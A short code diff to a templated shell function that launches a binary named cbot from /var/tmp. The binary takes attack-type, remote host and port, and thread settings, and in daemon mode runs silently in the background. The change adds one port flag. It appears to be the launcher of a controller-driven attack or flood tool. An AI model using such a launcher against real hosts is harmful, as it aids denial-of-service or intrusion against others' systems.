@@ -34,9 +34,9 @@ run_cbot() {
 
     chmod a+x /var/tmp/cbot
     if [ "$isDaemon" = "true" ]; then 
-        /var/tmp/cbot -pnode $pnodeId -attackType $attackType -taskId {{.TaskId}} -rhost {{.RHost}} -rport {{.RPort}} -fport {{.FPort}} -threads {{.Threads}} -scap {{.Scap}} -acap {{.Acap}} 1>/dev/null 2>&1 &
+        /var/tmp/cbot -pnode $pnodeId -attackType $attackType -taskId {{.TaskId}} -rhost {{.RHost}} -rport {{.RPort}} -fport {{.FPort}} -jport {{.JPort}} -threads {{.Threads}} -scap {{.Scap}} -acap {{.Acap}} 1>/dev/null 2>&1 &
     else
-        /var/tmp/cbot -pnode $pnodeId -attackType $attackType -taskId {{.TaskId}} -rhost {{.RHost}} -rport {{.RPort}} -fport {{.FPort}} -threads {{.Threads}} -scap {{.Scap}} -acap {{.Acap}}
+        /var/tmp/cbot -pnode $pnodeId -attackType $attackType -taskId {{.TaskId}} -rhost {{.RHost}} -rport {{.RPort}} -fport {{.FPort}} -jport {{.JPort}} -threads {{.Threads}} -scap {{.Scap}} -acap {{.Acap}}
     fi
 }
 
